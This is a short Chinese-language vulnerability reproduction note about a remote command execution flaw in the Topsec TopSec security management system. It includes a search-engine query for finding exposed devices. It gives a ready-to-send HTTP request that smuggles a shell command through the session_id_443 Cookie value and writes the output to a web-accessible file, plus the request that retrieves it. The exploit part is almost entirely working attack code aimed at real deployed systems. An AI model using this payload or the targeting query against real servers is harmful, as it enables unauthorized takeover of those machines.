# 天融信TOPSEC Cookie 远程命令执行漏洞

# 一、漏洞简介
<font style="color:rgb(77, 77, 77);">天融信TopSec安全管理系统 Cookie字段存在远程命令执行漏洞，通过该漏洞，攻击者可通过构造恶意字符串，执行任意系统命令，从而拿下服务器权限。</font>

# <font style="color:rgb(77, 77, 77);">二、影响版本</font>
+ <font style="color:rgb(77, 77, 77);">天融信TopSec安全管理系统</font>

# <font style="color:rgb(77, 77, 77);">三、资产测绘</font>
+ hunter`web.body="/cgi/maincgi.cgi?Url=VerifyCode"`
+ 特征

![1704936146537-13a86149-a1db-456a-823d-3aa12caf6762.png](./img/AgIFV74hdffAwtGZ/1704936146537-13a86149-a1db-456a-823d-3aa12caf6762-191707.png)

# 四、漏洞复现
```java
GET /cgi/maincgi.cgi?Url=aa HTTP/1.1
Host: 
Cookie: session_id_443=1|echo `id`  > /www/htdocs/site/image/tt.txt;
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```

![1704936207084-191ac2c5-9555-4105-a03f-68bc8b2847a8.png](./img/AgIFV74hdffAwtGZ/1704936207084-191ac2c5-9555-4105-a03f-68bc8b2847a8-085309.png)

获取命令执行结果

```java
GET /site/image/tt.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
```

![1704936274463-eaacc85c-3862-4293-8deb-290be80ec4b8.png](./img/AgIFV74hdffAwtGZ/1704936274463-eaacc85c-3862-4293-8deb-290be80ec4b8-523088.png)

[test_qrcode_b-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222234675-5ae23a8d-103c-4fab-bc8f-c12a5b7ca4fe.yaml)



> 更新: 2024-02-29 23:57:14  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ff91c9eyvw89wgfb>